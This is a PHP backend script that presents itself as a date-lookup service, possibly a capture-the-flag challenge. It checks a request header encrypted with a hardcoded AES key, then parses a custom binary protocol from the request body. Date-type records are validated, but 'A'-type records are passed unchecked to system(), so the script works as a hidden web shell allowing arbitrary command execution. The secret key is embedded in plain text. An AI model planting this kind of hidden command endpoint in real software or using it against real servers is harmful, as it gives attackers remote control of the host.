<?php
$Secret_key = "Fidy66rEB65mnE5UbPyEsgMxmmhdNebU";

function base64url_decode($data)
{
    return base64_decode(strtr($data, '-_', '+/') . str_repeat('=', (4 - strlen($data) % 4) % 4));
}

function decrypt($data, $key)
{
    $method = 'AES-256-CBC';
    $data = base64url_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    return openssl_decrypt($encrypted, $method, $key, OPENSSL_RAW_DATA, $iv);
}

function isValidDate($date)
{
    $d = DateTime::createFromFormat('Y-m-d', $date);
    return $d && $d->format('Y-m-d') === $date;
}

if (!isset($_SERVER['HTTP_X_SOURCE'])) {
    die("非法访问");
}

$source = decrypt($_SERVER['HTTP_X_SOURCE'], $Secret_key);
if ($source !== 'index.php') {
    die("非法访问");
}

$input = file_get_contents('php://input');
if (strlen($input) < 3) {
    die("无效的请求数据");
}

$offset = 0;
$outputAll = [];

while ($offset + 3 <= strlen($input)) {
    $type = $input[$offset];
    $length = unpack('n', substr($input, $offset + 1, 2))[1];
    $command = substr($input, $offset + 3, $length);
    $offset += 3 + $length;
    if ($type != "B" && $type != "A") {
        die("错误的协议格式");
    }
    if ($type === "B") {
        $date = $command;
        if (!isValidDate($date)) {
            die("日期格式错误");
        }
        $command = "date -d " . $date;
    }
    ob_start();
    system($command);
    $result = ob_get_clean();
    echo "<div class='block'><pre>" . htmlspecialchars($result) . "</pre></div>";
}
